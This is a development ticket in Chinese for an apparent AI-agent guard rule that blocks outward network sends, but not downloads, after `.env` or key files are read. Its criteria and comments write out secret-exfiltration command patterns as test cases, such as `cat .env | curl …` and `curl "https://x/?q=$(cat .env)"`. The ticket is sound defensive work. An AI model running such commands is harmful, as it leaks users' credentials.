# 30 — 读过密钥后只拦往外送

Status: ready-for-agent
Blocked by: 05（时序规则引擎与 v1 规则模板）
Spec: [第一阶段规格](../spec.md) 第 9 节（守卫、v1 规则模板、底线）、第 21 节（实现细节补充）

## What to build

v1 规则模板里"读过 `.env` 或密钥文件之后不许对外发送、不许发 HTTP 请求"原来按最严算：读过之后，同一任务（或同一会话段）里所有联网操作一律禁止，连装依赖、`git pull` 都做不了，碰过 `.env` 的开发任务因此卡死。用户 2026-10-08 定：改成**只拦往外送**。

- 读过密钥之后仍一律禁止的：非 GET 的 HTTP 请求（POST、PUT、PATCH、DELETE 等），带数据或上传的请求（比如 curl 的 `-d`、`--data*`、`-F`、`-T`、`--upload-file`，wget 的 `--post-*`），发消息、发邮件，推送，发布，建远端仓库，以及看不出方向的联网脚本（脚本扫描报了用到联网库的）。
- 读过密钥之后照常按处置走的：只读的 GET / HEAD 请求和下载、装依赖、`git pull` / `fetch` / `clone`。
- "对外内容不许含密钥"（底线"把凭据写进对外内容"用的同一套密钥形态和取内容口径）扩展到 GET 的网址（含查询串、带凭据的网址如 `https://<token>@host/…`）和联网命令的参数，命中即"永不"，不管之前读没读过密钥。

"往外送"和"往下拉"的区分只在这条规则里用，不改变联网开关（关着时一律拒绝）和各关注类别的既有判定。

## Acceptance criteria

- [x] 守卫切面（表格和场景文件）：读过 `.env` 之后，POST 请求、带 `-d` 的 curl、`-F` 上传、推送、建远端仓库、发消息、用到联网库的脚本都判一律禁止；GET 请求、`npm install`、`git pull`、`git clone` 不再被这条规则拦，按原有处置判定。
- [x] 守卫切面：没读过密钥时，GET 网址或联网命令参数里含密钥形态的字符串（查询串里、网址的用户信息里），判"永不"。
- [x] 守卫切面：bash 里同一管道或先后执行的组合（`cat .env | curl …`、`curl -d @.env …`、先 `cat .env` 再 `curl -X POST …`）仍被拦；`cat .env` 之后单独一个 `curl https://example.com/` 不被这条规则拦。
- [x] 带类型的工具（28 号票）和通用 bash 里的同一操作结论一致。
- [x] 主切面：一个维护者会话里读过 `.env` 之后装依赖成功执行，推送被拦下并说明原因。
- [x] 文档：开发说明里守卫一节、规则模板的注释和说明文字同步改。
- [x] 所有测试通过（vitest），lint（oxlint）无报错。

## Notes

- 剩余风险写进开发说明：密钥被编码或变形后（比如 base64）放进 GET 网址，正则认不出。
- 28 号票（带类型的 bash 工具）正在并行修改守卫的工具注册表，改动要小而集中，收尾前变基到最新 main。

## Comments

做法和决定（2026-10-08，实现时）：

- **"往外送"是规则看到的一步上的新字段 `$current.outward`**（`rule-steps.ts`，照 ADR-0005"推出来的字段放在一步上"）。v1 模板只把 `when` 从 `$current.sends` 换成它，规则仍是 planguard 格式、走同一套校验；`STEP_FIELDS` 加了 `outward`，用户的规则和 26 号票编译出的规则也能用。
- **认法放在已有的位置**：注册表加 `pullOnly`（只往下拉：`install_deps`、`install_global`、`git_fetch`、`network_read`）和参数上的 `payload`（请求带出去的数据）；`http_request` 加参数 `data`（`payload`），curl / wget / httpie 的数据和上传选项在 `shell/programs.ts` 原来认方法的地方一起填上，"方法写成 GET 但带数据"的（`curl -G -d …`、`curl -X GET --data-binary …`）也算往外送。只读方法表仍是 `READ_ONLY_HTTP_METHODS`。没标 `pullOnly` 的联网工具（包括以后的 MCP 工具，比如网页搜索）默认按往外送算，27 号票登记 MCP 工具时按需标。
- **管道和命令替换**：票里要求 `cat .env | curl …` 仍被拦、`cat .env` 之后单独一个 `curl https://example.com/` 不拦。只按方向判的话，`curl "https://x/?q=$(cat .env)"`、`K=$(cat .env); curl "…?k=$K"`、`cat .env | xargs curl …` 都是 GET，会把刚读的密钥原样带出去，正则也看不见。所以 bash 拆出的调用多带一个 `unseenInput`（`shell/split.ts`、`programs.ts`）：标准输入来自管道、here-doc 或重定向，命令里（含命令前的赋值）有没法静态确定的词，xargs 补上的参数，curl `-K`、wget `-i` / `-e` 这类配置和输入文件——守卫看不全它发了什么，这样的联网调用按往外送算。代价：读过密钥之后，网址里带变量的下载（`curl -o x "https://…/$VER/…"`）也会被拦，要写成静态网址或请用户处理。`cat .env; curl https://example.com/`（同一条命令里先后执行、网址静态）不拦。`unseenInput` 不进效果日志，`$prior.outward` 只按工具和参数算。
- **下载并运行软件包（`npx` 这类，`run_package`）按往外送算**：跑的是任意代码，看不出方向，票里允许的清单里也没有它。连远端主机的（`scp`、`ssh` 这类，`network_command`）同样按往外送算，下载方向的 `scp host:file .` 也拆不出来。
- **对外内容的口径**（`secrets.ts` 的 `outboundTextOf`，底线和 v1 模板共用）：会联网发东西的工具（`sendsOut`）除路径以外的全部参数（数组逐个），加上 bash 那段命令原文。以前只看 `outbound` 工具的内容、收件人、网址类参数，`git clone https://<token>@…`、`npm install git+https://<token>@…`、带类型的 `git_push` 的 `remote`、`install_deps` 的包名、MCP 联网工具的其他参数都查不到。底线的判定也从只查 `outbound` 的工具改成查 `sendsOut` 的工具，两处一致。
- **新加一种密钥形态"网址里的密码或 token"**（`url_credentials`：`scheme://用户名:密码@`、`scheme://<20 位以上的 token>@`），对应票里"带凭据的网址如 `https://<token>@host/…`"；`ssh://git@host`、`git@host:repo` 不算。它和别的形态一样也用于邮件正文这类对外内容（文档里写的 `postgres://user:pass@localhost` 也会被拦，宁可多拦）。查询串里 `access_token=`、`client_secret=` 这类带前缀的键名现有的"赋值形式"正则认不出，没有改，免得把分页 token 之类也拦下。
- 顺带修了 `curl --data-urlencode '名字@文件'` 不认读文件的问题（读 `.env` 发出去的组合靠它）。
- **主切面**：28 号票已合并，用它的测试接缝 `maintainerToolkit`、PATH 上假的 pnpm、本地裸仓库（`test/main/secret-read-outbound.test.ts`）：维护者会话（起草计划那一段）读 `.env` → 跑测试 → 带类型的装依赖、bash 的 `pnpm install` 都执行成功 → 带类型的推送、bash 的 `git push` 都判永不、不出审批卡，模型收到原因，远端没有任何分支。15 号票的项目维护者还没合并，用的是任务维护者。
